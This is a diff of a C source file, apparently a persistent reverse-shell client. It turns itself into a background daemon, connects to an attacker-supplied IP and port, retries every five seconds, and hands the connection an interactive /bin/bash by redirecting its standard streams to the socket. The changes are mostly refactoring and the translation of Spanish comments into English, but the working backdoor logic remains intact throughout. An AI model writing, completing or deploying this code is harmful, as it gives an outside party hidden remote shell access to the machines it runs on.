@@ -9,9 +9,9 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/types.h>
-#include <unistd.h>
 #include <sys/wait.h>
 #include <termios.h>
+#include <unistd.h>
 
 #define SHELL "/bin/bash"
 #define MAX_BUF 1024
@@ -33,24 +33,11 @@ int chk_argno(int* argc)
     return 0;
 }
 
-int send_message(int* sockfd, char buffer[MAX_BUF])
-{
-    scanf("%s", buffer);
-    return send(*sockfd, buffer, strlen(buffer), MSG_EOR | MSG_NOSIGNAL);
-}
-
 int create_socket()
 {
     int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    int reuse = 1;
 
     fcntl(sockfd, F_SETFD, FD_CLOEXEC);
-
-    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int)) < 0)
-        error((char*)"setsockopt(SO_REUSEADDR) failed");
-
-    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(int)) < 0)
-        error((char*)"setsockopt(SO_REUSEPORT) failed");
 
     return sockfd;
 }
@@ -59,20 +46,20 @@ struct sockaddr_in create_serv_addr(char* argv[])
 {
     struct sockaddr_in serv_addr;
 
-    memset(&serv_addr, 0, sizeof(serv_addr));
+    memset(
+        &serv_addr, 0, sizeof(serv_addr)); // Initialize serv_addr with zeroes
 
-    serv_addr.sin_family        = AF_INET;
-    serv_addr.sin_port          = htons(atoi(argv[2]));
-    serv_addr.sin_addr.s_addr   = inet_addr(argv[1]);
-    
+    serv_addr.sin_family = AF_INET;                 // Domain
+    serv_addr.sin_port = htons(atoi(argv[2]));      // Port
+    serv_addr.sin_addr.s_addr = inet_addr(argv[1]); // IP Address
+
     return serv_addr;
 }
 
 int reconnect(int sockfd)
 {
     close(sockfd);
-    sockfd = create_socket();
-    return sockfd;
+    return create_socket();
 }
 
 int main(int argc, char* argv[])
@@ -81,33 +68,39 @@ int main(int argc, char* argv[])
     daemon(1, 0);
     chk_argno(&argc);
 
-    pid_t pid;
+    struct sockaddr_in serv_addr = create_serv_addr(argv);
 
-    char buffer[MAX_BUF];
     int sockfd = create_socket();
     int status;
-    void (*osighand)(int);
+
     bool conn_flag = false;
-    struct sockaddr_in serv_addr = create_serv_addr(argv);
+    void (*osighand)(int);
+
+    pid_t pid;
+
 infinite_loop:
-    // Intento conectarme a un servidor que este escuchando conexiones.
+
+    // Tries to connect to the server every 5 seconds until it succeds
     if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) >= 0) {
         conn_flag = true;
-        memset(&buffer, 0, MAX_BUF);
         osighand = signal(SIGCHLD, SIG_DFL);
+
         if ((pid = fork()) == 0) {
             signal(SIGPIPE, SIG_DFL);
+
             for (int i = 0; i < 3; i++) {
                 close(i);
                 dup2(sockfd, i);
             }
+
             execl(SHELL, SHELL, "-i", (char*)NULL);
         }
     } else {
-        //  Si el cliente no logra contectarse, espera 5 segundos y vuelve a
-        //  intentar
+        //  If it doesnt connect it tries again in 5 seconds
         sleep(5);
     }
+
+    // If connection is lost...
     if (conn_flag) {
         while (waitpid(pid, &status, 0) == -1) {
         }
